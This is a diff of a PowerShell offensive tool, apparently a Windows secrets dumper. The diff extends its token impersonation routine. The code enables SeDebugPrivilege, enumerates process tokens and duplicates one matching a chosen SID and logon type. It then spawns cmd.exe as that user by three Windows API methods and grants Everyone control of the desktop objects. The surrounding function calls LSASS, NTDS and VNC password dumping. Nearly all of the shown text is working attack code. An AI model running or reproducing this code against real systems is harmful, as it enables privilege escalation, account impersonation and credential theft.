+					$Discard = [TokensAPI]::CloseHandle($LuidPtr)
+					Continue
+				}
+				Else
+				{
+					$LogonSessionData = [System.Runtime.InteropServices.Marshal]::PtrToStructure($LogonSessionDataPtr, [Type](New-Object TokensAPI+SECURITY_LOGON_SESSION_DATA).GetType())
+					$LogonType = $LogonSessionData.LogonType
+				}
+				
+				# ProcessID:SessionID:Domain:UserName:SID:LogonID:TokenType:LogonType
+				Write-Host ("[+] {0}:{1}:{2}:{3}:{4}:{5}:{6}:{7}" -f ($ProcessIds[$i], $SessionID, $Domain, $UserName, $SID, $LogonID, $TokenType, $LogonType))
 				$Discard = [TokensAPI]::CloseHandle($ProcHandle)
 				$Discard = [TokensAPI]::CloseHandle($TokenHandle)
 				[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenInfoPtr)
 			}
-			
-			$Discard = [TokensAPI]::CloseHandle($ProcHandle)
 		}
 	}
-	
+
 	return
 }
 
-function ImpersonateToken($SIDToImpersonate)
-{	
-	# Load Tokens functions
-	LoadTokensAPI
-	
-	# Enable SeDebugPrivilege
-	If (-not (EnableSeDebug)) { return }
-	
-	Write-Host ("`n[+] Try to impersonate Session Token with SID = {0}" -f ($SID))
+function ImpersonateToken($SIDToImpersonate, $LogonTypeToImpersonate, $Method)
+{
+	Write-Host ("`n[+] Try to impersonate Session Token with SID = {0}" -f ($SIDToImpersonate))
 	$SIDFound = $False
 	
-	# Enumerate all processes
-	$ArraySize = 120
-	$ArrayBytesSize = $ArraySize * [System.Runtime.InteropServices.Marshal]::SizeOf((New-Object UInt32))
-	$ProcessIds = New-Object UInt32[] $ArraySize
-	$BytesCopied = $ArrayBytesSize
-	While ($BytesCopied -eq $ArrayBytesSize)
+	# Load Tokens functions
+	LoadTokensAPI
+
+	# Enable require privilege: SeDebugPrivilege
+	If (-not (EnablePrivilege "SeDebugPrivilege"))
 	{
-		$ArraySize += 10
-		$ArrayBytesSize = $ArraySize * [System.Runtime.InteropServices.Marshal]::SizeOf((New-Object UInt32))
-		$ProcessIds = New-Object UInt32[] $ArraySize
-		
-		$Succeeded = [TokensAPI]::EnumProcesses($ProcessIds, $ArrayBytesSize, [ref]$BytesCopied)
-		If (-not $Succeeded)
-		{
-			Write-Host ("[-] EnumProcesses() failed")
-			return
-		}
+		Write-Host ("[-] Failed to enable SeDebugPrivilege`n")
+		return
+	}
+
+	# Get current proccess ID and session ID
+	$CurProcID = [System.Diagnostics.Process]::GetCurrentProcess().Id
+	$CurSessionID = 0
+	$Res = [TokensAPI]::ProcessIdToSessionId($CurProcID, [ref]$CurSessionID)
+
+	# Enumerate all processes
+	$ArrayMaxProcesses = 100
+	$ArrayBytesSize = $ArrayMaxProcesses * [System.Runtime.InteropServices.Marshal]::SizeOf((New-Object UInt32))
+	$ProcessIds = New-Object UInt32[] $ArrayMaxProcesses
+	$BytesCopied = 0
+	$Succeeded = [TokensAPI]::EnumProcesses($ProcessIds, $ArrayBytesSize, [ref]$BytesCopied)
+	If (-not $Succeeded)
+	{
+		Write-Host ("[-] EnumProcesses() failed`n")
+		return
 	}
 	$NbProcesses = $BytesCopied / [System.Runtime.InteropServices.Marshal]::SizeOf((New-Object UInt32))
-	
+
+	If ($NbProcesses -eq 0)
+	{
+		Write-Host ("[-] Failed to enumerate any processes`n")
+		return
+	}
+
 	# Open each process
 	For ($i = 0; $i -lt $NbProcesses; $i += 1)
 	{
+		# Get this process session ID
+		$SessionID = 0
+		$Res = [TokensAPI]::ProcessIdToSessionId($ProcessIds[$i], [ref]$SessionID)
+
 		$ProcHandle = [TokensAPI]::OpenProcess([TokensAPI+ProcessAccessFlags]::PROCESS_QUERY_INFORMATION, $False, $ProcessIds[$i])
 		If ($ProcHandle.ToInt64())
 		{
 			$TokenHandle = New-Object IntPtr
-			$Succeeded = [TokensAPI]::OpenProcessToken($ProcHandle, [TokensAPI]::TOKEN_MANIP_ACCESS, [ref]$TokenHandle)
+			$Succeeded = [TokensAPI]::OpenProcessToken($ProcHandle, [TokensAPI]::TOKEN_DUPLICATE -bor [TokensAPI]::TOKEN_READ -bor [TokensAPI]::TOKEN_QUERY, [ref]$TokenHandle)
 			If ($Succeeded)
 			{
 				# Get token information
 				$TokenInfoLength = 0
-				
-				# Call one time to get token info struct length
+
+				### TokenUser: SIDPtr to string SID ###
 				$Succeeded = [TokensAPI]::GetTokenInformation($TokenHandle, [TokensAPI+TOKEN_INFORMATION_CLASS]::TokenUser, 0, $TokenInfoLength, [ref]$TokenInfoLength)
 				If (-not $Succeeded)
 				{
@@ -5544,8 +5823,8 @@ function ImpersonateToken($SIDToImpersonate)
 						Continue
 					}
 				}
-				
-				[IntPtr]$TokenInfoPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenInfoLength)				
+
+				[IntPtr]$TokenInfoPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenInfoLength)
 				$Succeeded = [TokensAPI]::GetTokenInformation($TokenHandle, [TokensAPI+TOKEN_INFORMATION_CLASS]::TokenUser, $TokenInfoPtr, $TokenInfoLength, [ref]$TokenInfoLength)
 				If (-not $Succeeded)
 				{
@@ -5554,10 +5833,10 @@ function ImpersonateToken($SIDToImpersonate)
 					[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenInfoPtr)
 					Continue
 				}
-				
+
 				$TokenInfo = New-Object TokensAPI+TOKEN_USER
 				$Cast = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenInfoPtr, [Type]$TokenInfo.GetType())
-				
+
 				$SIDPtr = $Cast.User.Sid
 				$SIDPtrString = 0
 				$Succeeded = [TokensAPI]::ConvertSidToStringSid($SIDPtr, [ref]$SIDPtrString)
@@ -5568,28 +5847,24 @@ function ImpersonateToken($SIDToImpersonate)
 					[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenInfoPtr)
 					Continue
 				}
-				
 				$SID = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($SIDPtrString)
+				[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenInfoPtr)
 				
-				$cchName = 0
-				$cchReferencedDomainName = 0
-				$peUse = New-Object TokensAPI+SID_NAME_USE
-				# Call one time to get strings length
-				$Succeeded = [TokensAPI]::LookupAccountSidW($Null, $SIDPtr, $Null, [ref]$cchName, $Null, [ref]$cchReferencedDomainName, [ref]$peUse)
+				### TokenStatistics: AuthenticationID, LogonID, TokenType ###
+				$TokenInfoLength = 0
+				$Succeeded = [TokensAPI]::GetTokenInformation($TokenHandle, [TokensAPI+TOKEN_INFORMATION_CLASS]::TokenStatistics, 0, $TokenInfoLength, [ref]$TokenInfoLength)
 				If (-not $Succeeded)
 				{
 					If ([TokensAPI]::GetLastError() -ne [TokensAPI]::ERROR_INSUFFICIENT_BUFFER)
 					{
 						$Discard = [TokensAPI]::CloseHandle($ProcHandle)
 						$Discard = [TokensAPI]::CloseHandle($TokenHandle)
-						[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenInfoPtr)
 						Continue
 					}
 				}
-				
-				$UserName = New-Object Text.StringBuilder $cchName
-				$Domain = New-Object Text.StringBuilder $cchReferencedDomainName
-				$Succeeded = [TokensAPI]::LookupAccountSidW($Null, $SIDPtr, $UserName, [ref]$cchName, $Domain, [ref]$cchReferencedDomainName, [ref]$peUse)
+
+				[IntPtr]$TokenInfoPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenInfoLength)
+				$Succeeded = [TokensAPI]::GetTokenInformation($TokenHandle, [TokensAPI+TOKEN_INFORMATION_CLASS]::TokenStatistics, $TokenInfoPtr, $TokenInfoLength, [ref]$TokenInfoLength)
 				If (-not $Succeeded)
 				{
 					$Discard = [TokensAPI]::CloseHandle($ProcHandle)
@@ -5597,70 +5872,148 @@ function ImpersonateToken($SIDToImpersonate)
 					[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenInfoPtr)
 					Continue
 				}
+
+				$TokenInfo = New-Object TokensAPI+TOKEN_STATISTICS
+				$Cast = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenInfoPtr, [Type]$TokenInfo.GetType())
+				$LogonID = $Cast.AuthenticationId.LowPart
+				$TokenType = $Cast.TokenType
 				
-				If ($SID -eq $SIDToImpersonate)
+				### Get LogonType ###
+				$LuidPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type](New-Object TokensAPI+LUID).GetType()))
+				[System.Runtime.InteropServices.Marshal]::StructureToPtr($Cast.AuthenticationId, $LuidPtr, $False)
+
+				[IntPtr]$LogonSessionDataPtr = [IntPtr]::Zero
+				$ReturnVal = [TokensAPI]::LsaGetLogonSessionData($LuidPtr, [Ref]$LogonSessionDataPtr)
+				If ($ReturnVal -ne 0 -and $LogonSessionDataPtr -eq [IntPtr]::Zero)
+				{
+					Write-Host ("LsaGetLogonSessionData() failed with error {0}" -f ([TokensAPI]::GetLastError()))
+					$Discard = [TokensAPI]::CloseHandle($ProcHandle)
+					$Discard = [TokensAPI]::CloseHandle($TokenHandle)
+					$Discard = [TokensAPI]::CloseHandle($LuidPtr)
+					Continue
+				}
+				Else
+				{
+					$LogonSessionData = [System.Runtime.InteropServices.Marshal]::PtrToStructure($LogonSessionDataPtr, [Type](New-Object TokensAPI+SECURITY_LOGON_SESSION_DATA).GetType())
+					$LogonType = $LogonSessionData.LogonType
+				}
+
+				If (($SID -eq $SIDToImpersonate) -and ($LogonType -eq $LogonTypeToImpersonate))
 				{
 					$SIDFound = $True
 					$DupToken = New-Object IntPtr
 					$lpTokenAttributes = New-Object TokensAPI+SECURITY_ATTRIBUTES
-					$Succeeded = [TokensAPI]::DuplicateTokenEx($TokenHandle, [TokensAPI]::TOKEN_ALL_ACCESS, [ref]$lpTokenAttributes, [TokensAPI+SECURITY_IMPERSONATION_LEVEL]::SecurityImpersonation, [TokensAPI+TOKEN_TYPE]::TokenImpersonation, [ref]$DupToken)
+					$Succeeded = [TokensAPI]::DuplicateTokenEx($TokenHandle, [TokensAPI]::TOKEN_ALL_ACCESS, [ref]$lpTokenAttributes, [TokensAPI+SECURITY_IMPERSONATION_LEVEL]::SecurityImpersonation, [TokensAPI+TOKEN_TYPE]::TokenPrimary, [ref]$DupToken)
 					If (-not $Succeeded)
 					{
 						$Discard = [TokensAPI]::CloseHandle($ProcHandle)
 						$Discard = [TokensAPI]::CloseHandle($TokenHandle)
-						[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenInfoPtr)
 						Continue
 					}
 					
-					$STARTF_USESHOWWINDOW = 1
-					$SW_SHOW = 5
-					$lpStartupInfo = New-Object TokensAPI+STARTUPINFO
-					$lpStartupInfo.cb = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$lpStartupInfo.GetType())
-					$lpStartupInfo.lpReserved = 0
-					$lpStartupInfo.lpDesktop = 0
-					$lpStartupInfo.lpTitle = 0
-					$lpStartupInfo.dwFlags = $STARTF_USESHOWWINDOW
-					$lpStartupInfo.cbReserved2 = 0
-					$lpStartupInfo.lpReserved2 = 0
-					$lpStartupInfo.wShowWindow = $SW_SHOW
-					$lpProcessInformation = New-Object TokensAPI+PROCESS_INFORMATION
-					$lpProcessInformation.hProcess = 0xffffffffffffffff
-					$lpProcessInformation.hThread = 0xffffffffffffffff
-					$lpProcessInformation.dwProcessId = 0
-					$lpProcessInformation.dwThreadId = 0
-					$CmdLinePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni("C:\\Windows\\System32\\cmd.exe")
-					$Succeeded = [TokensAPI]::CreateProcessWithTokenW($DupToken, [TokensAPI+LogonFlags]::NetCredentialsOnly, 0, $CmdLinePtr, [TokensAPI+CreationFlags]::NewConsole, 0, 0, [ref]$lpStartupInfo, [ref]$lpProcessInformation)
-					If (-not $Succeeded)
+					If ($Method -eq "ImpersonateLoggedOnUser")
 					{
-						Write-Host ("[-] CreateProcessWithTokenW() failed with error {0}" -f ([TokensAPI]::GetLastError()))
+						$Succeeded = [TokensAPI]::ImpersonateLoggedOnUser($DupToken)
+						If (-not $Succeeded)
+						{
+							Write-Host ("[-] ImpersonateLoggedOnUser() failed with error {0}`n" -f ([TokensAPI]::GetLastError()))
+						}
+						Else
+						{
+							Write-Host ("[+] Successfully impersonated token for requested SID with ImpersonateLoggedOnUser()`n")
+						}
 					}
 					Else
 					{
-						Write-Host ("[+] Successfully impersonated token for requested SID`n")
+						If ($Method -eq "CreateProcessWithTokenW")
+						{
+							# This method allow to spawn a graphical process
+							# When impersonating another user than NT\SYSTEM, this user will not have full permission on the Window Station and Desktop objects and the GUI will be partially rendered
+							# Thus It is required to add an ACL to grant the "Everyone" group full control of the current Windows Station and Desktop
+							# https://clymb3r.wordpress.com/2013/11/03/powershell-and-token-impersonation/
+							Set-DesktopACLs
+							
+							<#
+								Other method with SetTokenInformation() to edit duplicate token session ID to match ours
+								It required NT\SYSTEM access with SeTcbPrivilege
+							#>
+							<#
+							[IntPtr]$TokenInfoPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type](New-Object UInt32).GetType()))
+							$Bytes = [System.BitConverter]::GetBytes([UInt32]$CurSessionID)
+							[System.Runtime.InteropServices.Marshal]::Copy($Bytes, 0, $TokenInfoPtr, [System.Runtime.InteropServices.Marshal]::SizeOf([Type](New-Object UInt32).GetType()))
+							$Succeeded = [TokensAPI]::SetTokenInformation($DupToken, [TokensAPI+TOKEN_INFORMATION_CLASS]::TokenSessionId, $TokenInfoPtr, [System.Runtime.InteropServices.Marshal]::SizeOf([Type](New-Object UInt32).GetType()))
+							If (-not $Succeeded)
+							{
+								Write-host ("[-] SetTokenInformation() failed with error {0}" -f ([TokensAPI]::GetLastError()))
+								
+								$Discard = [TokensAPI]::CloseHandle($DupToken)
+								$Discard = [TokensAPI]::CloseHandle($ProcHandle)
+								$Discard = [TokensAPI]::CloseHandle($TokenHandle)
+								
+								return
+							}
+							#>
+							
+							$lpStartupInfo = New-Object TokensAPI+STARTUPINFO
+							$lpProcessInformation = New-Object TokensAPI+PROCESS_INFORMATION
+							$CmdLinePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni("C:\\Windows\\System32\\cmd.exe")
+							$Succeeded = [TokensAPI]::CreateProcessWithTokenW($DupToken, 0, 0, $CmdLinePtr, 0, 0, 0, [ref]$lpStartupInfo, [ref]$lpProcessInformation)
+							If (-not $Succeeded)
+							{
+								Write-Host ("[-] CreateProcessWithTokenW() failed with error {0}`n" -f ([TokensAPI]::GetLastError()))
+							}
+							Else
+							{
+								Write-Host ("[+] Successfully impersonated token for requested SID with CreateProcessWithTokenW()`n")
+							}
+							
+							
+							[System.Runtime.InteropServices.Marshal]::FreeHGlobal($CmdLinePtr)
+						}
+						ElseIf ($Method -eq "CreateProcessAsUserW")
+						{
+							# This method allow to spawn a terminal process
+							# It require NT\SYSTEM access and SeAssignPrimaryTokenPrivilege for calling CreateProcessAsUserW()
+							If (-not (EnablePrivilege "SeAssignPrimaryTokenPrivilege"))
+							{
+								Write-Host ("[-] Failed to enable SeAssignPrimaryTokenPrivilege`n")
+								return
+							}
+						
+							$lpStartupInfo = New-Object TokensAPI+STARTUPINFO
+							$lpProcessInformation = New-Object TokensAPI+PROCESS_INFORMATION
+							$CmdLinePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni("C:\\Windows\\System32\\cmd.exe /c cmd")
+							$Succeeded = [TokensAPI]::CreateProcessAsUserW($DupToken, 0, $CmdLinePtr, 0, 0, $False, 0, 0, 0, [ref]$lpStartupInfo, [ref]$lpProcessInformation)
+							If (-not $Succeeded)
+							{
+								Write-Host ("[-] CreateProcessAsUserW() failed with error {0}`n" -f ([TokensAPI]::GetLastError()))
+							}
+							Else
+							{
+								Write-Host ("[+] Successfully impersonated token for requested SID with CreateProcessAsUserW()`n")
+								$SpawnProc = Get-CIMInstance -ClassName win32_process -filter "parentprocessid = '$($([System.Diagnostics.Process]::GetCurrentProcess().Id))'" | Select ProcessId
+								Wait-Process -Id $SpawnProc.ProcessId
+							}
+							
+							[System.Runtime.InteropServices.Marshal]::FreeHGlobal($CmdLinePtr)
+						}
 					}
-				}
-				
-				$Discard = [TokensAPI]::CloseHandle($ProcHandle)
-				$Discard = [TokensAPI]::CloseHandle($TokenHandle)
-				[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenInfoPtr)
-				If ($SIDFound)
-				{
+					
 					$Discard = [TokensAPI]::CloseHandle($DupToken)
-					[System.Runtime.InteropServices.Marshal]::FreeHGlobal($CmdLinePtr)
+					$Discard = [TokensAPI]::CloseHandle($ProcHandle)
+					$Discard = [TokensAPI]::CloseHandle($TokenHandle)
 					
 					return
 				}
 			}
-			
-			$Discard = [TokensAPI]::CloseHandle($ProcHandle)
 		}
 	}
-	
+
 	If (-not $SIDFound)
 	{
 		Write-Host ("[-] No Session Tokens found with this SID`n")
 	}
-	
+
 	return
 }
 
@@ -10121,10 +10474,10 @@ function Get-WindowsSecrets()
 	{
 		$SID = $ImpersonateToken
 		ImpersonateToken $SID
-		
+
 		return
 	}
-	
+
 	$Tokens = ListSessionTokens
 
 	$Pwds, $NTHs, $MasterKeys = Get-LSASS -Method "ProcOpen"
@@ -10244,6 +10597,6 @@ function Get-WindowsSecrets()
 
 	Get-VNCPwds
 	$Users = Get-NTDS -Method "Shadow Copy" $BootKey
-	
+
 	Write-Host ""
 }
